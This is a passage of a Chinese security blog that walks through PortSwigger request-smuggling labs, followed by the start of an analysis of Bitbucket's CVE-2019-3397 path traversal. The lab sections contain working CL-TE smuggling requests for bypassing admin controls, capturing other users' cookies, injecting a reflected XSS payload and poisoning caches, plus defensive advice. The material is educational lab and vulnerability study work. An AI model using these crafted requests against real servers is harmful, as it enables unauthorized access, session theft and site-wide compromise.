class="hljs-symbol">\n</span><br>GET /random_str.php HTTP/1.1<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>Host: lnmp.mengsec.com<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br><span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br></code></pre></td></tr></table></figure><p>第一次请求</p><p><img src="https://image.mengsec.com/request-smugging/image-20191009222245467.png" alt="image-20191009222245467"></p><p>第二次请求</p><p><img src="https://image.mengsec.com/request-smugging/image-20191009222313671.png" alt="image-20191009222313671"></p><p>可以看到，当缓存命中时，请求体中的数据变成了下一个请求，并且成功的获得了响应。</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">GET /random_str.php HTTP/1.1<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>Host: lnmp.mengsec.com<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br><span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br></code></pre></td></tr></table></figure><p>而且在整个请求中，所有的请求头都是符合RFC规范的，这就意味着，在ATS前方的代理服务器，哪怕严格实现了RFC标准，也无法避免该攻击行为对其他用户造成影响。</p><p>ATS的修复措施也是简单粗暴，当缓存命中时，把整个请求体清空就好了。</p><h2 id="5-其他攻击实例"><a href="#5-其他攻击实例" class="headerlink" title="5. 其他攻击实例"></a>5. 其他攻击实例</h2><p>在前面，我们已经看到了不同种代理服务器组合所产生的HTTP请求走私漏洞，也成功模拟了使用HTTP请求走私这一攻击手段来进行会话劫持，但它能做的不仅仅是这些，在PortSwigger中提供了利用HTTP请求走私攻击的<a href="https://portswigger.net/web-security/request-smuggling/exploiting">实验</a>，可以说是很典型了。</p><h3 id="5-1-绕过前端服务器的安全控制"><a href="#5-1-绕过前端服务器的安全控制" class="headerlink" title="5.1 绕过前端服务器的安全控制"></a>5.1 绕过前端服务器的安全控制</h3><p>在这个网络环境中，前端服务器负责实现安全控制，只有被允许的请求才能转发给后端服务器，而后端服务器无条件的相信前端服务器转发过来的全部请求，对每个请求都进行响应。因此我们可以利用HTTP请求走私，将无法访问的请求走私给后端服务器并获得响应。在这里有两个实验，分别是使用<code>CL-TE</code>和<code>TE-CL</code>绕过前端的访问控制。</p><h4 id="5-1-1-使用CL-TE绕过前端服务器安全控制"><a href="#5-1-1-使用CL-TE绕过前端服务器安全控制" class="headerlink" title="5.1.1 使用CL-TE绕过前端服务器安全控制"></a>5.1.1 使用CL-TE绕过前端服务器安全控制</h4><p>Lab地址：<a href="https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-cl-te">https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-cl-te</a></p><p>实验的最终目的是获取admin权限并删除用户carlos</p><p>我们直接访问<code>/admin</code>，会返回提示<code>Path /admin is blocked</code>，看样子是被前端服务器阻止了，根据题目的提示<code>CL-TE</code>，我们可以尝试构造数据包</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">POST</span> / HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Host</span>: ac<span class="hljs-number">1</span>b<span class="hljs-number">1</span>f<span class="hljs-number">991</span>edef<span class="hljs-number">1</span>f<span class="hljs-number">1802323</span>bc<span class="hljs-number">00</span>e<span class="hljs-number">10084</span>.web-security-academy.net<br><span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Macintosh; Intel Mac OS X <span class="hljs-number">10</span>.<span class="hljs-number">14</span>; rv:<span class="hljs-number">56</span>.<span class="hljs-number">0</span>) Gecko/<span class="hljs-number">20100101</span> Firefox/<span class="hljs-number">56</span>.<span class="hljs-number">0</span><br><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span>,*/*;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span><br><span class="hljs-attribute">Accept</span>-Language: en-US,en;q=<span class="hljs-number">0</span>.<span class="hljs-number">5</span><br><span class="hljs-attribute">Cookie</span>: session=Iegl<span class="hljs-number">0</span>O<span class="hljs-number">4</span>SGnwlddlFQzxduQdt<span class="hljs-number">8</span>NwqWsKI<br><span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">38</span><br><span class="hljs-attribute">Transfer</span>-Encoding: chunked<br><br><span class="hljs-attribute">0</span><br><br><span class="hljs-attribute">GET</span> /admin HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">foo</span>: bar<br><br><br></code></pre></td></tr></table></figure><p>进行多次请求之后，我们可以获得走私过去的请求的响应。</p><p><img src="https://image.mengsec.com/request-smugging/image-20191010000428090.png" alt="image-20191010000428090"></p><p>提示只有是以管理员身份访问或者在本地登录才可以访问<code>/admin</code>接口。</p><p>在下方走私的请求中，添加一个<code>Host: localhost</code>请求头，然后重新进行请求，一次不成功多试几次。</p><p>如图所示，我们成功访问了admin界面。也知道了如何删除一个用户，也就是对<code>/admin/delete?username=carlos</code>进行请求。</p><p><img src="https://image.mengsec.com/request-smugging/image-20191010000749732.png" alt="image-20191010000749732"></p><p>修改下走私的请求包再发送几次即可成功删除用户<code>carlos</code>。</p><p><img src="https://image.mengsec.com/request-smugging/image-20191010000957520.png" alt="image-20191010000957520"></p><p>需要注意的一点是在这里，不需要我们对其他用户造成影响，因此走私过去的请求也必须是一个完整的请求，最后的两个<code>\r\n</code>不能丢弃。</p><h4 id="5-1-1-使用TE-CL绕过前端服务器安全控制"><a href="#5-1-1-使用TE-CL绕过前端服务器安全控制" class="headerlink" title="5.1.1 使用TE-CL绕过前端服务器安全控制"></a>5.1.1 使用TE-CL绕过前端服务器安全控制</h4><p>Lab地址：<a href="https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-te-cl">https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-te-cl</a></p><p>这个实验与上一个就十分类似了，具体攻击过程就不在赘述了。</p><p><img src="https://image.mengsec.com/request-smugging/image-20190903111613344.png" alt="image-20190903111613344"></p><h3 id="5-2-获取前端服务器重写请求字段"><a href="#5-2-获取前端服务器重写请求字段" class="headerlink" title="5.2 获取前端服务器重写请求字段"></a>5.2 获取前端服务器重写请求字段</h3><p>在有的网络环境下，前端代理服务器在收到请求后，不会直接转发给后端服务器，而是先添加一些必要的字段，然后再转发给后端服务器。这些字段是后端服务器对请求进行处理所必须的，比如：</p><ul><li>描述TLS连接所使用的协议和密码</li><li>包含用户IP地址的XFF头</li><li>用户的会话令牌ID</li></ul><p>总之，如果不能获取到代理服务器添加或者重写的字段，我们走私过去的请求就不能被后端服务器进行正确的处理。那么我们该如何获取这些值呢。PortSwigger提供了一个很简单的方法，主要是三大步骤：</p><ul><li>找一个能够将请求参数的值输出到响应中的POST请求</li><li>把该POST请求中，找到的这个特殊的参数放在消息的最后面</li><li>然后走私这一个请求，然后直接发送一个普通的请求，前端服务器对这个请求重写的一些字段就会显示出来。</li></ul><p>怎么理解呢，还是做一下实验来一起来学习下吧。</p><p>Lab地址：<a href="https://portswigger.net/web-security/request-smuggling/exploiting/lab-reveal-front-end-request-rewriting">https://portswigger.net/web-security/request-smuggling/exploiting/lab-reveal-front-end-request-rewriting</a></p><p>实验的最终目的还是删除用户 <code>carlos</code>。</p><p>我们首先进行第一步骤，找一个能够将请求参数的值输出到响应中的POST请求。</p><p>在网页上方的搜索功能就符合要求</p><p><img src="https://image.mengsec.com/request-smugging/image-20191010003510203.png" alt="image-20191010003510203"></p><p>构造数据包</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">POST</span> / HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Host</span>: ac<span class="hljs-number">831</span>f<span class="hljs-number">8</span>c<span class="hljs-number">1</span>f<span class="hljs-number">287</span>d<span class="hljs-number">3</span>d<span class="hljs-number">808</span>d<span class="hljs-number">2</span>e<span class="hljs-number">1</span>c<span class="hljs-number">00280087</span>.web-security-academy.net<br><span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Macintosh; Intel Mac OS X <span class="hljs-number">10</span>.<span class="hljs-number">14</span>; rv:<span class="hljs-number">56</span>.<span class="hljs-number">0</span>) Gecko/<span class="hljs-number">20100101</span> Firefox/<span class="hljs-number">56</span>.<span class="hljs-number">0</span><br><span class="hljs-attribute">Content</span>-Type: application/x-www-form-urlencoded<br><span class="hljs-attribute">Cookie</span>: session=<span class="hljs-number">2</span>rOrjC<span class="hljs-number">16</span>pIb<span class="hljs-number">7</span>ZfURX<span class="hljs-number">8</span>QlSuU<span class="hljs-number">1</span>v<span class="hljs-number">6</span>UMAXLA<br><span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">77</span><br><span class="hljs-attribute">Transfer</span>-Encoding: chunked<br><br><span class="hljs-attribute">0</span><br><br><br><span class="hljs-attribute">POST</span> / HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">70</span><br><span class="hljs-attribute">Connection</span>: close<br><br><span class="hljs-attribute">search</span>=<span class="hljs-number">123</span><br><br></code></pre></td></tr></table></figure><p>多次请求之后就可以获得前端服务器添加的请求头</p><p><img src="https://image.mengsec.com/request-smugging/image-20190903114123823-0639157.png" alt="image-20190903114123823"></p><p>这是如何获取的呢，可以从我们构造的数据包来入手，可以看到，我们走私过去的请求为</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>70<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><br>search=123<br><br></code></pre></td></tr></table></figure><p>其中<code>Content-Length</code>的值为70，显然下面携带的数据的长度是不够70的，因此后端服务器在接收到这个走私的请求之后，会认为这个请求还没传输完毕，继续等待传输。</p><p>接着我们又继续发送相同的数据包，后端服务器接收到的是前端代理服务器已经处理好的请求，当接收的数据的总长度到达70时，后端服务器认为这个请求已经传输完毕了，然后进行响应。这样一来，后来的请求的一部分被作为了走私的请求的参数的一部分，然后从响应中表示了出来，我们就能获取到了前端服务器重写的字段。</p><p>在走私的请求上添加这个字段，然后走私一个删除用户的请求就好了。</p><p><img src="https://image.mengsec.com/request-smugging/image-20190903114641180.png" alt="image-20190903114641180"></p><h3 id="5-3-获取其他用户的请求"><a href="#5-3-获取其他用户的请求" class="headerlink" title="5.3 获取其他用户的请求"></a>5.3 获取其他用户的请求</h3><p>在上一个实验中，我们通过走私一个不完整的请求来获取前端服务器添加的字段，而字段来自于我们后续发送的请求。换句话说，我们通过请求走私获取到了我们走私请求之后的请求。如果在我们的恶意请求之后，其他用户也进行了请求呢？我们寻找的这个POST请求会将获得的数据存储并展示出来呢？这样一来，我们可以走私一个恶意请求，将其他用户的请求的信息拼接到走私请求之后，并存储到网站中，我们再查看这些数据，就能获取用户的请求了。这可以用来偷取用户的敏感信息，比如账号密码等信息。</p><p>Lab地址：<a href="https://portswigger.net/web-security/request-smuggling/exploiting/lab-capture-other-users-requests">https://portswigger.net/web-security/request-smuggling/exploiting/lab-capture-other-users-requests</a></p><p>实验的最终目的是获取其他用户的Cookie用来访问其他账号。</p><p>我们首先去寻找一个能够将传入的信息存储到网站中的POST请求表单，很容易就能发现网站中有一个用户评论的地方。</p><p>抓取POST请求并构造数据包</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">POST</span> / HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Host</span>: ac<span class="hljs-number">661</span>f<span class="hljs-number">531</span>e<span class="hljs-number">07</span>f<span class="hljs-number">12180</span>eb<span class="hljs-number">2</span>f<span class="hljs-number">1</span>a<span class="hljs-number">009</span>d<span class="hljs-number">0092</span>.web-security-academy.net<br><span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Macintosh; Intel Mac OS X <span class="hljs-number">10</span>.<span class="hljs-number">14</span>; rv:<span class="hljs-number">56</span>.<span class="hljs-number">0</span>) Gecko/<span class="hljs-number">20100101</span> Firefox/<span class="hljs-number">56</span>.<span class="hljs-number">0</span><br><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span>,*/*;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span><br><span class="hljs-attribute">Accept</span>-Language: en-US,en;q=<span class="hljs-number">0</span>.<span class="hljs-number">5</span><br><span class="hljs-attribute">Cookie</span>: session=oGESUVlKzuczaZSzsazFsOCQ<span class="hljs-number">4</span>fdLetwa<br><span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">267</span><br><span class="hljs-attribute">Transfer</span>-Encoding: chunked<br><br><span class="hljs-attribute">0</span><br><br><span class="hljs-attribute">POST</span> /post/comment HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Host</span>: ac<span class="hljs-number">661</span>f<span class="hljs-number">531</span>e<span class="hljs-number">07</span>f<span class="hljs-number">12180</span>eb<span class="hljs-number">2</span>f<span class="hljs-number">1</span>a<span class="hljs-number">009</span>d<span class="hljs-number">0092</span>.web-security-academy.net<br><span class="hljs-attribute">Cookie</span>: session=oGESUVlKzuczaZSzsazFsOCQ<span class="hljs-number">4</span>fdLetwa<br><span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">400</span><br><br><span class="hljs-attribute">csrf</span>=JDqCEvQexfPihDYr<span class="hljs-number">08</span>mrlMun<span class="hljs-number">4</span>ZJsrpX<span class="hljs-number">7</span>&amp;postId=<span class="hljs-number">5</span>&amp;name=meng&amp;email=email%<span class="hljs-number">40</span>qq.com&amp;website=&amp;comment=<br></code></pre></td></tr></table></figure><p>这样其实就足够了，但是有可能是实验环境的问题，我无论怎么等都不会获取到其他用户的请求，反而抓了一堆我自己的请求信息。不过原理就是这样，还是比较容易理解的，最重要的一点是，走私的请求是不完整的。</p><p><img src="https://image.mengsec.com/request-smugging/image-20191010011955268.png" alt="image-20191010011955268"></p><h3 id="5-4-利用反射型XSS"><a href="#5-4-利用反射型XSS" class="headerlink" title="5.4 利用反射型XSS"></a>5.4 利用反射型XSS</h3><p>我们可以使用HTTP走私请求搭配反射型XSS进行攻击，这样不需要与受害者进行交互，还能利用漏洞点在请求头中的XSS漏洞。</p><p>Lab地址：<a href="https://portswigger.net/web-security/request-smuggling/exploiting/lab-deliver-reflected-xss">https://portswigger.net/web-security/request-smuggling/exploiting/lab-deliver-reflected-xss</a></p><p>在实验介绍中已经告诉了前端服务器不支持分块编码，目标是执行alert(1)</p><p>首先根据UA出现的位置构造Payload</p><p><img src="https://image.mengsec.com/request-smugging/image-20190903144329596.png" alt="image-20190903144329596"></p><p>然后构造数据包</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>ac801fd21fef85b98012b3a700820000.web-security-academy.net<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>123<br><span class="hljs-attribute">Transfer-Encoding</span><span class="hljs-punctuation">: </span>chunked<br><br>0<br><br><span class="hljs-keyword">GET</span> <span class="hljs-string">/post?postId=5</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;#<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br></code></pre></td></tr></table></figure><p>此时在浏览器中访问，就会触发弹框</p><p><img src="https://image.mengsec.com/request-smugging/image-20190903162524009.png" alt="image-20190903162524009"></p><p>再重新发一下，等一会刷新，可以看到这个实验已经解决了。</p><h3 id="5-5-进行缓存投毒"><a href="#5-5-进行缓存投毒" class="headerlink" title="5.5 进行缓存投毒"></a>5.5 进行缓存投毒</h3><p>一般来说，前端服务器出于性能原因，会对后端服务器的一些资源进行缓存，如果存在HTTP请求走私漏洞，则有可能使用重定向来进行缓存投毒，从而影响后续访问的所有用户。</p><p>Lab地址：<a href="https://portswigger.net/web-security/request-smuggling/exploiting/lab-perform-web-cache-poisoning">https://portswigger.net/web-security/request-smuggling/exploiting/lab-perform-web-cache-poisoning</a></p><p>实验环境中提供了漏洞利用的辅助服务器。</p><p>需要添加两个请求包，一个POST，携带要走私的请求包，另一个是正常的对JS文件发起的GET请求。</p><p>以下面这个JS文件为例</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/resources/</span>js/labHeader.js<br></code></pre></td></tr></table></figure><p>编辑响应服务器</p><p><img src="https://image.mengsec.com/request-smugging/image-20190903170042395.png" alt="image-20190903170042395"></p><p>构造POST走私数据包</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs"><span class="hljs-keyword">POST</span> <span class="hljs-string">/</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>ac761f721e06e9c8803d12ed0061004f.web-security-academy.net<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>129<br><span class="hljs-attribute">Transfer-Encoding</span><span class="hljs-punctuation">: </span>chunked<br><br>0<br><br><span class="hljs-keyword">GET</span> <span class="hljs-string">/post/next?postId=3</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>acb11fe31e16e96b800e125a013b009f.web-security-academy.net<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>10<br><br>123<br></code></pre></td></tr></table></figure><p>然后构造GET数据包</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">GET</span> /resources/js/labHeader.js HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Host</span>: ac<span class="hljs-number">761</span>f<span class="hljs-number">721</span>e<span class="hljs-number">06</span>e<span class="hljs-number">9</span>c<span class="hljs-number">8803</span>d<span class="hljs-number">12</span>ed<span class="hljs-number">0061004</span>f.web-security-academy.net<br><span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Macintosh; Intel Mac OS X <span class="hljs-number">10</span>.<span class="hljs-number">14</span>; rv:<span class="hljs-number">56</span>.<span class="hljs-number">0</span>) Gecko/<span class="hljs-number">20100101</span> Firefox/<span class="hljs-number">56</span>.<span class="hljs-number">0</span><br><span class="hljs-attribute">Connection</span>: close<br></code></pre></td></tr></table></figure><p>POST请求和GET请求交替进行，多进行几次，然后访问js文件，响应为缓存的漏洞利用服务器上的文件。</p><p><img src="https://image.mengsec.com/request-smugging/image-20190903172338456.png" alt="image-20190903172338456"></p><p>访问主页，成功弹窗，可以知道，js文件成功的被前端服务器进行了缓存。</p><p><img src="https://image.mengsec.com/request-smugging/image-20190903172544103.png" alt="image-20190903172544103"></p><h2 id="6-如何防御"><a href="#6-如何防御" class="headerlink" title="6. 如何防御"></a>6. 如何防御</h2><p>从前面的大量案例中，我们已经知道了HTTP请求走私的危害性，那么该如何防御呢？不针对特定的服务器，通用的防御措施大概有三种。</p><ul><li>禁用代理服务器与后端服务器之间的TCP连接重用。</li><li>使用HTTP/2协议。</li><li>前后端使用相同的服务器。</li></ul><p>以上的措施有的不能从根本上解决问题，而且有着很多不足，就比如禁用代理服务器和后端服务器之间的TCP连接重用，会增大后端服务器的压力。使用HTTP/2在现在的网络条件下根本无法推广使用，哪怕支持HTTP/2协议的服务器也会兼容HTTP/1.1。从本质上来说，HTTP请求走私出现的原因并不是协议设计的问题，而是不同服务器实现的问题，个人认为最好的解决方案就是严格的实现RFC7230-7235中所规定的的标准，但这也是最难做到的。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://regilero.github.io/english/security/2019/10/17/security_apache_traffic_server_http_smuggling/">https://regilero.github.io/english/security/2019/10/17/security_apache_traffic_server_http_smuggling/</a></li><li><a href="https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn">https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn</a></li><li><a href="https://www.cgisecurity.com/lib/HTTP-Request-Smuggling.pdf">https://www.cgisecurity.com/lib/HTTP-Request-Smuggling.pdf</a></li><li><a href="https://media.defcon.org/DEF%20CON%2024/DEF%20CON%2024%20presentations/DEF%20CON%2024%20-%20Regilero-Hiding-Wookiees-In-Http.pdf">https://media.defcon.org/DEF%20CON%2024/DEF%20CON%2024%20presentations/DEF%20CON%2024%20-%20Regilero-Hiding-Wookiees-In-Http.pdf</a></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>HTTP请求走私</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Bitbucket 目录穿越导致RCE漏洞(CVE-2019-3397)分析</title>
    <link href="/2019/09/29/bitbucket-path-travel-to-rce/"/>
    <url>/2019/09/29/bitbucket-path-travel-to-rce/</url>
    
    <content type="html"><![CDATA[<p>CVE-2019-3397的漏洞分析，第一次调试Java，Java的可读性是真的好:p</p><a id="more"></a><h2 id="1-漏洞简介"><a href="#1-漏洞简介" class="headerlink" title="1. 漏洞简介"></a>1. 漏洞简介</h2><p>Bitbucket 数据中心版存在一个数据迁移工具，可以将其他服务器上的仓库导入到本机中，导入的仓库数据是一个Tar包，当攻击者拥有服务器的admin权限，可以构造恶意的Tar包并导入，由于系统在处理Tar包时，没有对获取到的路径进行有效的验证，就直接进行的文件创建操作，这就导致了目录穿越漏洞，而Tar包又是可控的，里面的hooks脚本也是可控的。我们通过目录穿越，可以将恶意的hooks脚本导入到某个仓库中，当该仓库进行git push或者git pull操作时，恶意脚本会执行，从而实现远程代码执行。</p><h2 id="2-测试环境简介"><a href="#2-测试环境简介" class="headerlink" title="2. 测试环境简介"></a>2. 测试环境简介</h2><ul><li><p>Ubuntu 16.04</p></li><li><p>Bitbucket 6.1.1 数据中心版</p></li></ul><h2 id="3-利用效果"><a href="#3-利用效果" class="headerlink" title="3. 利用效果"></a>3. 利用效果</h2><p>在服务端执行一个<code>id</code>命令。</p><p><img src="https://image.mengsec.com/bitbucket/image-20190928213247583.png"></p><h2 id="4-漏洞分析"><a href="#4-漏洞分析" class="headerlink" title="4. 漏洞分析"></a>4. 漏洞分析</h2><h3 id="4-1-漏洞原理分析"><a href="#4-1-漏洞原理分析" class="headerlink" title="4.1 漏洞原理分析"></a>4.1 漏洞原理分析</h3><p>路径：</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-regexp">/WEB-INF/</span>lib<span class="hljs-regexp">/bitbucket-service-impl-6.1.1.jar!/</span>com<span class="hljs-regexp">/atlassian/</span>stash<span class="hljs-regexp">/internal/mig</span>ration/TarArchiveSource.<span class="hljs-keyword">class</span><br></code></pre></td></tr></table></figure><p>在第<code>46-67</code>行：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">extractToDisk</span><span class="hljs-params">(<span class="hljs-meta">@Nonnull</span> Path target, <span class="hljs-meta">@Nonnull</span> Predicate&lt;String&gt; filter)</span> <span class="hljs-keyword">throws</span> IOException </span>&#123;<br>    Objects.requireNonNull(target, <span class="hljs-string">&quot;target&quot;</span>);<br>    Objects.requireNonNull(filter, <span class="hljs-string">&quot;filter&quot;</span>);<br>    <span class="hljs-keyword">this</span>.read((entrySource) -&gt; &#123;<br>        Path entryPath = entrySource.getPath();<br>        String filename = entryPath.getFileName().toString();<br>        <span class="hljs-keyword">if</span> (filename.endsWith(<span class="hljs-string">&quot;.atl.deleted&quot;</span>)) &#123;<br>            Path fileToDelete = entryPath.resolveSibling(filename.substring(<span class="hljs-number">0</span>, filename.length() - <span class="hljs-string">&quot;.atl.deleted&quot;</span>.length()));<br>            log.debug(<span class="hljs-string">&quot;Deleting entry &#x27;&#123;&#125;&#x27; in &#x27;&#123;&#125;&#x27;&quot;</span>, fileToDelete, target);<br>            Path path = target.resolve(fileToDelete);<br><br>            <span class="hljs-keyword">try</span> &#123;<br>                Files.delete(path);<br>            &#125; <span class="hljs-keyword">catch</span> (NoSuchFileException var7) &#123;<br>                log.debug(<span class="hljs-string">&quot;Deleting entry &#x27;&#123;&#125;&#x27; in &#x27;&#123;&#125;&#x27; failed&quot;</span>, <span class="hljs-keyword">new</span> Object[]&#123;fileToDelete, target, var7&#125;);<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            entrySource.extractToDisk(target.resolve(entryPath));<br>        &#125;<br><br>    &#125;, filter);<br>&#125;<br></code></pre></td></tr></table></figure><p>可以看到，代码中存在一个递归调用。</p><p>在导入时，目标为</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-regexp">/home/m</span>engchen<span class="hljs-regexp">/atlassian/</span>application-data<span class="hljs-regexp">/bitbucket/</span>shared<span class="hljs-regexp">/data/</span><span class="hljs-keyword">repositories</span><span class="hljs-regexp">/153/im</span>ported-hooks<br></code></pre></td></tr></table></figure><p><img src="https://image.mengsec.com/bitbucket/image-20190928232425389.png"></p><p>继续跟下去，很明显，在处理hooks脚本所在的数据包时，使用<code>getPath</code>方法获取到脚本的路径。此刻为</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">..<span class="hljs-regexp">/hooks/</span>pre-receive.d/<span class="hljs-number">233</span>_bitbucket_callback<br></code></pre></td></tr></table></figure><p><img src="https://image.mengsec.com/bitbucket/image-20190928232945305.png"></p><p>然后直接进入到了第<code>63</code>行</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">entrySource.extractToDisk(target.resolve(entryPath));<br></code></pre></td></tr></table></figure><p>后面又调用了第<code>108</code>行的<code>extractToDisk</code>方法。</p><p><img src="https://image.mengsec.com/bitbucket/image-20190928233258900.png"></p><p>在图中我们可以看到，传入到父类<code>extractToDisk</code>方法的<code>target</code>值为</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-regexp">/home/m</span>engchen<span class="hljs-regexp">/atlassian/</span>application-data<span class="hljs-regexp">/bitbucket/</span>shared<span 